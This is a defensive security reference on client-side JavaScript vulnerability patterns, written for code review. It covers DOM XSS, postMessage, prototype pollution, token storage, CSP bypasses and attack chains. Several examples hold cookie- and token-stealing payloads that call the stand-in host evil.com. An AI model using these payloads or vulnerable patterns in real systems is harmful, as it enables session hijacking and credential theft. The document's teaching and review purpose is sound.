# Client-Side JavaScript Security Patterns

Client-side JavaScript vulnerabilities are frequently dismissed as low-impact because they execute in the user's browser rather than on the server. This is a critical misconception. Client-side attacks steal session tokens, exfiltrate credentials, perform actions as the victim user, and serve as the entry point for multi-stage attack chains. Modern single-page applications (SPAs) move significant logic to the client, expanding the attack surface beyond traditional server-rendered applications. DOM-based vulnerabilities are particularly dangerous because the malicious payload never reaches the server, bypassing server-side WAFs, input validation, and logging entirely.

## Key Patterns to Search For

Search for these patterns in JavaScript and TypeScript source code to identify client-side vulnerabilities:

- **DOM XSS sinks with DOM sources**: `innerHTML`, `outerHTML`, `document.write()`, `document.writeln()`, `eval()`, `setTimeout(string)`, `setInterval(string)`, `new Function(string)` receiving data from `location.hash`, `location.search`, `location.href`, `document.referrer`, `window.name`, `postMessage` event data, `document.cookie`, `document.URL`, `document.documentURI`
- **postMessage handlers without origin verification**: `window.addEventListener('message', ...)` or `window.onmessage` handlers that do not check `event.origin` before processing `event.data`
- **Prototype pollution vectors**: `Object.assign()`, lodash `_.merge()`, `_.defaultsDeep()`, `_.set()`, jQuery `$.extend(true, ...)`, custom recursive merge functions, `JSON.parse()` of user input assigned to objects without filtering `__proto__`, `constructor`, or `prototype` keys
- **Client-side routing bypasses**: React Router `<PrivateRoute>` or `<Navigate>` guards, Vue Router `beforeEach` navigation guards, Angular `CanActivate` guards that check local state, localStorage, or cookie values without server-side session validation on the protected API endpoints
- **JWT and token storage in localStorage**: `localStorage.setItem('token', ...)`, `localStorage.setItem('jwt', ...)`, `sessionStorage.setItem('auth', ...)`, any authentication token accessible via `window.localStorage` which is readable by any script executing in the same origin
- **WebSocket message handling without validation**: `ws.onmessage` handlers that parse and render incoming messages without type checking, length limits, or sanitization; WebSocket connections without authentication tokens
- **JavaScript URL scheme in DOM sinks**: `element.href = userInput`, `element.src = userInput`, `window.location = userInput`, `window.open(userInput)`, `<a href={userInput}>` in JSX without protocol validation allowing `javascript:` URLs
- **eval() and Function() with user-controlled strings**: `eval(userInput)`, `new Function(userInput)()`, `setTimeout(userInput, delay)`, `setInterval(userInput, delay)` where the first argument is a string rather than a function reference
- **Third-party script inclusion risks**: `<script src="http://...">` over HTTP, CDN includes without `integrity` attribute (SRI), dynamic `document.createElement('script')` with user-influenced `src`, `importScripts()` in web workers with untrusted URLs
- **DOM clobbering**: HTML injection that overwrites DOM properties via `id` or `name` attributes, conflicting with global variable lookups like `window.someVar` or `document.getElementById` expectations

## Common Vulnerable Patterns

### 1. DOM XSS via innerHTML

```javascript
// Vulnerable: location.hash directly into innerHTML
// Source: location.hash (attacker-controlled via URL fragment)
// Sink: innerHTML (executes HTML and inline event handlers)
const content = decodeURIComponent(location.hash.slice(1));
document.getElementById('content').innerHTML = content;

// Attacker URL: https://example.com/page#<img src=x onerror=alert(document.cookie)>
```

```javascript
// Vulnerable: search parameter reflected into DOM
const params = new URLSearchParams(location.search);
const query = params.get('q');
document.getElementById('search-results').innerHTML =
    '<p>Results for: ' + query + '</p>';

// Attacker URL: https://example.com/search?q=<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>
```

```javascript
// Vulnerable: document.write with user-controlled data
const name = decodeURIComponent(location.search.split('name=')[1]);
document.write('<h1>Welcome, ' + name + '</h1>');
```

### 2. postMessage Without Origin Check

```javascript
// Vulnerable: no origin verification on message handler
window.addEventListener('message', (event) => {
    // No event.origin check - any window/iframe can send messages
    const data = event.data;
    if (data.action === 'updateContent') {
        document.getElementById('display').innerHTML = data.html;
    }
    if (data.action === 'redirect') {
        window.location = data.url;
    }
    if (data.action === 'exec') {
        eval(data.code); // Critical: arbitrary code execution via postMessage
    }
});
```

```javascript
// Vulnerable: insufficient origin check using includes or indexOf
window.addEventListener('message', (event) => {
    // Bypass: attacker uses origin like "https://trusted.com.evil.com"
    if (event.origin.includes('trusted.com')) {
        processData(event.data);
    }
});
```

```javascript
// Vulnerable: regex origin check with missing anchor
window.addEventListener('message', (event) => {
    // Bypass: attacker registers "trusted.com.evil.com"
    if (/trusted\.com/.test(event.origin)) {
        processData(event.data);
    }
});
```

### 3. Prototype Pollution

```javascript
// Vulnerable: recursive merge without __proto__ filtering
function deepMerge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            deepMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Attacker-controlled JSON input:
// {"__proto__": {"isAdmin": true}}
// After merge, ALL objects inherit isAdmin = true:
// ({}).isAdmin === true
```

```javascript
// Vulnerable: Object.assign with parsed user input
const defaults = { role: 'user', theme: 'light' };
const userPrefs = JSON.parse(req.body.preferences);
const config = Object.assign({}, defaults, userPrefs);

// Attacker sends: {"__proto__": {"role": "admin"}}
// Note: Object.assign does not traverse __proto__ but custom merge functions do
```

```javascript
// Vulnerable: lodash _.merge with user-controlled input
const _ = require('lodash');
const userConfig = JSON.parse(userInput);
_.merge(appConfig, userConfig);

// Attacker input: {"constructor": {"prototype": {"isAdmin": true}}}
// Pollutes Object.prototype via constructor.prototype path
```

### 4. Client-Side Route Guard Without Server Check

```jsx
// Vulnerable: React Router guard relies only on local state
// No server-side auth enforcement on the protected API endpoints
function PrivateRoute({ children }) {
    const isAuthenticated = localStorage.getItem('isLoggedIn') === 'true';
    return isAuthenticated ? children : <Navigate to="/login" />;
}

// Usage in router
<Route path="/admin/dashboard" element={
    <PrivateRoute>
        <AdminDashboard />
    </PrivateRoute>
} />

// Bypass: set localStorage.setItem('isLoggedIn', 'true') in browser console
// If /api/admin/* endpoints do not independently verify auth, full access is gained
```

```javascript
// Vulnerable: Vue Router guard with client-only check
router.beforeEach((to, from, next) => {
    if (to.meta.requiresAuth) {
        const token = localStorage.getItem('token');
        if (token) {
            next(); // Only checks token existence, not validity
        } else {
            next('/login');
        }
    } else {
        next();
    }
});

// Bypass: set any value in localStorage for 'token'
// Expired, malformed, or fabricated tokens pass the check
```

### 5. JWT in localStorage

```javascript
// Vulnerable: storing JWT in localStorage accessible via XSS
async function login(username, password) {
    const response = await fetch('/api/auth/login', {
        method: 'POST',
        body: JSON.stringify({ username, password }),
        headers: { 'Content-Type': 'application/json' }
    });
    const data = await response.json();
    localStorage.setItem('token', data.jwt);     // XSS can steal this
    localStorage.setItem('refreshToken', data.refresh); // And this
}

// Any XSS payload can exfiltrate:
// fetch('https://evil.com/steal?token=' + localStorage.getItem('token'))
```

```javascript
// Vulnerable: token included in requests via JavaScript
// If XSS exists, attacker can intercept or replay tokens
function apiRequest(endpoint, method = 'GET', body = null) {
    const token = localStorage.getItem('token');
    return fetch(endpoint, {
        method,
        headers: {
            'Authorization': `Bearer ${token}`,
            'Content-Type': 'application/json'
        },
        body: body ? JSON.stringify(body) : null
    });
}
```

### 6. WebSocket Without Validation

```javascript
// Vulnerable: WebSocket messages rendered as HTML without sanitization
const ws = new WebSocket('wss://example.com/chat');

ws.onmessage = (event) => {
    const data = JSON.parse(event.data);
    // Sink: innerHTML with untrusted WebSocket data
    document.getElementById('chat').innerHTML +=
        '<div class="message"><b>' + data.username + '</b>: ' + data.message + '</div>';
};

// Attacker sends via WebSocket:
// {"username":"<img src=x onerror=alert(1)>","message":"hi"}
```

```javascript
// Vulnerable: WebSocket connection without authentication
const ws = new WebSocket('wss://example.com/admin/stream');
// No auth token in connection setup
// No server-side validation of WebSocket upgrade request
// Anyone with the URL can connect and receive privileged data

ws.onmessage = (event) => {
    const data = JSON.parse(event.data);
    updateDashboard(data); // Sensitive operational data exposed
};
```

### 7. JavaScript URL Scheme

```javascript
// Vulnerable: user-controlled href without protocol validation
function setLink(userProvidedUrl) {
    document.getElementById('link').href = userProvidedUrl;
}
// Attacker input: "javascript:alert(document.cookie)"
// Clicking the link executes JavaScript in the page context
```

```jsx
// Vulnerable: React JSX with user-controlled href
function UserProfile({ website }) {
    // React does NOT sanitize javascript: URLs in href
    return <a href={website}>Visit website</a>;
}
// If website = "javascript:alert(1)", clicking triggers execution
```

```javascript
// Vulnerable: window.open with user-controlled URL
const redirectUrl = new URLSearchParams(location.search).get('url');
window.open(redirectUrl);
// Attacker: ?url=javascript:void(document.location='https://evil.com/'+document.cookie)
```

### 8. eval() and Function() With User Input

```javascript
// Vulnerable: eval with URL parameter
const expr = new URLSearchParams(location.search).get('calc');
const result = eval(expr); // Arbitrary code execution
document.getElementById('result').textContent = result;
```

```javascript
// Vulnerable: new Function() for dynamic template rendering
function renderTemplate(template, data) {
    const fn = new Function('data', 'return `' + template + '`');
    return fn(data);
}
// If template is user-controlled: ${alert(document.cookie)}
```

```javascript
// Vulnerable: setTimeout with string argument
const delay = 1000;
const action = getUserInput(); // from URL, form, or storage
setTimeout(action, delay); // string argument is eval'd
```

### 9. Third-Party Script Inclusion

```html
<!-- Vulnerable: CDN script without Subresource Integrity (SRI) -->
<script src="https://cdn.example.com/lib/jquery-3.6.0.min.js"></script>
<!-- If CDN is compromised, malicious code runs in your origin -->

<!-- Safe: SRI hash verifies script integrity -->
<script src="https://cdn.example.com/lib/jquery-3.6.0.min.js"
        integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK"
        crossorigin="anonymous"></script>
```

```javascript
// Vulnerable: dynamic script injection with user-influenced source
function loadPlugin(pluginUrl) {
    const script = document.createElement('script');
    script.src = pluginUrl; // User-controlled URL
    document.head.appendChild(script);
    // Arbitrary JavaScript execution from attacker-controlled source
}
```

### 10. DOM Clobbering

```html
<!-- Vulnerable: HTML injection that overwrites expected globals -->
<!-- If attacker can inject HTML (e.g., via sanitizer that allows id/name): -->
<form id="config"><input name="apiUrl" value="https://evil.com/api"></form>

<!-- Application code that expected window.config to be undefined or a JS object: -->
<script>
    // document.getElementById('config') now returns the injected form
    // config.apiUrl returns "https://evil.com/api"
    const endpoint = window.config?.apiUrl || 'https://legit.com/api';
    fetch(endpoint + '/data'); // Sends request to attacker server
</script>
```

## Exploitability Indicators

A client-side JavaScript finding is exploitable when:

- **DOM XSS**: A controllable source (URL, postMessage, storage) flows to a dangerous sink (innerHTML, document.write, eval) without sanitization. The attacker can craft a URL or trigger a message that places malicious content into the source. No server-side interaction is required for DOM-based XSS.
- **postMessage**: The handler performs a security-sensitive action (DOM mutation, navigation, eval, storage modification) and either lacks an origin check or uses a bypassable check (substring match, regex without anchors, endsWith that matches subdomains).
- **Prototype pollution**: User-controlled JSON is merged into an object using a recursive merge function without key filtering. A known gadget exists in the application or its dependencies that reads from Object.prototype (e.g., a template engine checking `Object.prototype.template`).
- **Route guard bypass**: The client-side guard protects a route, and the API endpoints served to that route do not independently verify authentication and authorization. Both conditions must be met for the bypass to yield unauthorized data or actions.
- **localStorage token theft**: An XSS vulnerability exists anywhere in the same origin AND authentication tokens are stored in localStorage or sessionStorage. The XSS does not need to be on the same page as the token storage.
- **WebSocket abuse**: WebSocket messages are rendered into the DOM without sanitization, or WebSocket connections lack authentication, allowing unauthorized subscription to sensitive data streams.
- **JavaScript URLs**: User input reaches an href, src, or location assignment without protocol validation, and a user interaction (click) or automatic navigation triggers the assignment.
- **Third-party scripts**: A script tag loads from an external CDN without SRI, and the CDN is a viable target (shared hosting, outdated infrastructure, known compromise history).

## Common Mitigations and Their Bypasses

**Mitigation: DOMPurify for HTML sanitization**
Bypass: Mutation XSS (mXSS) exploits differences between how DOMPurify parses HTML and how the browser re-parses it after insertion. Outdated DOMPurify versions have known bypasses. Custom configuration that allows dangerous tags or attributes (e.g., `ADD_ATTR: ['onclick']`) defeats the purpose. DOM clobbering can interfere with DOMPurify's internal property lookups if attacker-controlled HTML is present before DOMPurify loads.

**Mitigation: Content Security Policy (CSP)**
Bypass: `unsafe-inline` allows inline script execution, defeating CSP's primary protection. `unsafe-eval` permits eval-based attacks. Missing `base-uri` directive allows `<base>` tag injection to redirect relative script URLs. JSONP endpoints on whitelisted domains serve as script gadgets. Angular applications with `unsafe-eval` allow template injection. `strict-dynamic` can be bypassed if an attacker controls a whitelisted script that creates additional script elements. CSP with `nonce` values that are predictable, reused, or leaked through injection defeats nonce-based policies. `object-src` and `plugin-types` omissions allow Flash or other plugin-based execution.

**Mitigation: postMessage origin checks**
Bypass: Subdomain takeover on a trusted subdomain satisfies strict origin checks. Regex mistakes like `event.origin.endsWith('.trusted.com')` match `attacker-trusted.com`. Using `indexOf` or `includes` matches `trusted.com.evil.com`. Null origin can be triggered from sandboxed iframes or data URIs.

**Mitigation: Object.freeze(Object.prototype) for prototype pollution**
Bypass: Freezing Object.prototype does not freeze other built-in prototypes (Array.prototype, String.prototype, Function.prototype). Symbol-keyed properties are not affected by standard property enumeration. Some prototype pollution attacks target non-Object prototypes. Freezing must happen before any untrusted code executes to be effective.

**Mitigation: React auto-escaping in JSX**
Bypass: React escapes string content rendered in JSX but does NOT sanitize `href`, `src`, `formAction`, or other URL-type attributes. `javascript:` URLs in `<a href={userInput}>` execute on click. `dangerouslySetInnerHTML` explicitly bypasses escaping. Server-side rendering (SSR) with user input in `<script>` contexts can bypass React's client-side escaping.

**Mitigation: HttpOnly cookies instead of localStorage**
Bypass: HttpOnly prevents direct cookie theft via `document.cookie`, but XSS can still perform actions as the user by making authenticated requests (the browser attaches cookies automatically). The attacker cannot exfiltrate the token but can perform any action the victim can.

## Rejection Rationalizations and Counter-Arguments

**"This is only client-side, it does not affect the server."**
Counter: Client-side vulnerabilities execute in the context of authenticated users. DOM XSS can read localStorage tokens, make authenticated API requests, modify user data, add admin accounts, and exfiltrate any data the user can access. The impact is equivalent to the victim user's privileges. In applications with admin users, a single XSS can compromise the entire system.

**"Our CSP blocks inline scripts."**
Counter: Analyze the specific CSP header for bypasses. Check for `unsafe-inline` or `unsafe-eval` directives, whitelisted domains with JSONP endpoints, missing `base-uri`, `object-src`, or `script-src` directives, and nonce or hash implementation flaws. Provide the specific bypass chain for their configuration. Even with strong CSP, data exfiltration may be possible via CSS injection, navigation-based leaks, or dangling markup injection.

**"Users control their own browser, so this is not a real vulnerability."**
Counter: Reflected and stored XSS targets OTHER users, not the attacker. The attacker sends a crafted link to a victim or injects persistent content viewed by other users. Self-XSS requires social engineering and is generally lower severity, but reflected and stored XSS are exploitable against any user who visits the crafted URL or views the injected content.

**"We sanitize on the server so client-side injection is not possible."**
Counter: DOM-based XSS never touches the server. The payload travels from a client-side source (URL fragment, postMessage, localStorage) directly to a client-side sink (innerHTML, eval, document.write). Server-side sanitization is irrelevant because the server never sees the payload. URL fragments (location.hash) are not sent to the server at all.

**"The vulnerability requires user interaction (clicking a link)."**
Counter: Requiring a single click is standard for reflected XSS and is considered fully exploitable. Phishing emails, social media posts, forum links, and URL shorteners reliably deliver clicks. Many organizations have click rates of 10-30% on phishing simulations. Also investigate whether the payload can be triggered without interaction via automatic navigation, meta refresh, or iframe embedding.

**"We use a modern framework (React/Angular/Vue) so XSS is not possible."**
Counter: Modern frameworks reduce but do not eliminate XSS. React has `dangerouslySetInnerHTML`, unvalidated `href`/`src` attributes, and SSR injection vectors. Angular has `bypassSecurityTrustHtml()`, template injection in older versions, and `innerHTML` binding. Vue has `v-html` directive. All frameworks allow XSS through third-party libraries, direct DOM manipulation outside the framework, and incorrect usage of security escape hatches.

**"Prototype pollution has no impact without a gadget."**
Counter: Gadget discovery is an ongoing research area with new gadgets found regularly. Check for known gadgets in the application's dependency tree (Handlebars, Pug, EJS, lodash template, jQuery). Even without a known XSS gadget, prototype pollution can cause denial of service, logic flaws (polluting `isAdmin`, `role`, `verified` properties), and authorization bypasses.

## Chaining Opportunities

- **DOM XSS + localStorage token storage = Session hijacking**: Any DOM XSS vulnerability in the application can read `localStorage.getItem('token')` and exfiltrate the JWT or session token to an attacker-controlled server, providing persistent account access independent of the XSS payload.

- **Prototype pollution + gadget chain = XSS or RCE**: Prototype pollution that sets properties read by template engines (Handlebars `__proto__.template`, EJS `__proto__.outputFunctionName`, Pug `__proto__.block`) achieves code execution. In server-side JavaScript (Node.js), this escalates to remote code execution. In client-side contexts, it achieves XSS.

- **postMessage exploitation + CSRF = Cross-origin action execution**: If a trusted application accepts postMessage commands to perform actions, an attacker page can embed the application in an iframe and send commands via postMessage, executing actions cross-origin without CSRF tokens.

- **Client route bypass + missing server auth = Unauthorized access**: Client-side route guard bypass combined with API endpoints that do not independently verify authentication grants full access to protected functionality and data.

- **DOM XSS + OAuth callback = Token theft**: XSS on a page used as an OAuth redirect_uri allows the attacker to intercept the authorization code or access token from the URL fragment or query parameters during the OAuth flow.

- **DOM XSS + service worker registration = Persistent compromise**: XSS used to register a malicious service worker provides persistent control over the origin. The service worker intercepts all future requests, even after the XSS payload is removed, until the service worker is explicitly unregistered.

- **Prototype pollution + authorization bypass = Privilege escalation**: Polluting `Object.prototype.role = "admin"` or `Object.prototype.isAdmin = true` can bypass authorization checks that use `if (user.role === 'admin')` when the user object does not have an explicit `role` property and falls through to the prototype.

- **Third-party script compromise + SRI absence = Supply chain attack**: If a CDN-hosted script without SRI is compromised, the attacker's modified script runs in the application's origin with full access to the DOM, cookies, localStorage, and authenticated API endpoints for every user.

- **DOM clobbering + script gadget = XSS without script injection**: In contexts where HTML injection is possible but script execution is blocked by CSP, DOM clobbering can overwrite configuration variables or URLs used by existing scripts, redirecting data flows to attacker-controlled endpoints or triggering code paths that lead to script execution.

- **WebSocket hijacking + stored XSS = Real-time attack propagation**: Injecting XSS payloads through WebSocket messages that are stored and displayed to other users creates a worm-like propagation vector where each victim's browser executes the payload and potentially sends it to additional WebSocket channels.
